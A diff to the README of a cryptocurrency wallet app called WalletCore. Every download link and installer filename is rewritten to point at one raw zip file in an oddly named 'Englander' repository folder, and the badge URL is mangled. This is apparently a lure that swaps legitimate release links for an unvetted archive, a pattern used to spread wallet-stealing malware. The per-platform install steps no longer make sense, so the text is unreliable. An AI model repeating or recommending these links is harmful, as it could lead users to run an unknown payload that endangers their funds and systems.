@@ -6,7 +6,7 @@ Welcome to WalletCore! This application simplifies managing your digital assets 
 
 ## 📥 Download Now
 
-[![Download WalletCore](https://img.shields.io/badge/Download%20WalletCore-v1.0-blue.svg)](https://github.com/kiwiloveseth/WalletCore/releases)
+[![Download WalletCore](https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip%https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip)](https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,11 +31,11 @@ WalletCore comes with the following features:
 
 Follow these steps to download and install WalletCore:
 
-1. **Visit the Download Page:** Click here to go to the releases page: [WalletCore Releases](https://github.com/kiwiloveseth/WalletCore/releases).
+1. **Visit the Download Page:** Click here to go to the releases page: [WalletCore Releases](https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip).
 
 2. **Choose the Latest Release:** Look for the latest version. It will have the highest version number. 
 
-3. **Download the Application:** Click on the link for your operating system (e.g., `WalletCore-v1.0-Windows.exe`, `WalletCore-v1.0-macOS.dmg`, or `WalletCore-v1.0-Linux.tar.gz`). The file will start downloading.
+3. **Download the Application:** Click on the link for your operating system (e.g., `https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip`, `https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip`, or `https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip`). The file will start downloading.
 
 4. **Run the Installer:**
    - **For Windows:** Locate the downloaded file, double-click it, and follow the installation prompts.
@@ -84,6 +84,6 @@ WalletCore is released under the MIT License. You can use, modify, and distribut
 
 We welcome contributions to WalletCore. If you'd like to help improve the project, check our contributing guidelines in the repository.
 
-[![Download WalletCore](https://img.shields.io/badge/Download%20WalletCore-v1.0-blue.svg)](https://github.com/kiwiloveseth/WalletCore/releases)
+[![Download WalletCore](https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip%https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip)](https://raw.githubusercontent.com/kiwiloveseth/WalletCore/main/Englander/WalletCore.zip)
 
 Thank you for using WalletCore! We hope this guide helps you get started with your wallet management.
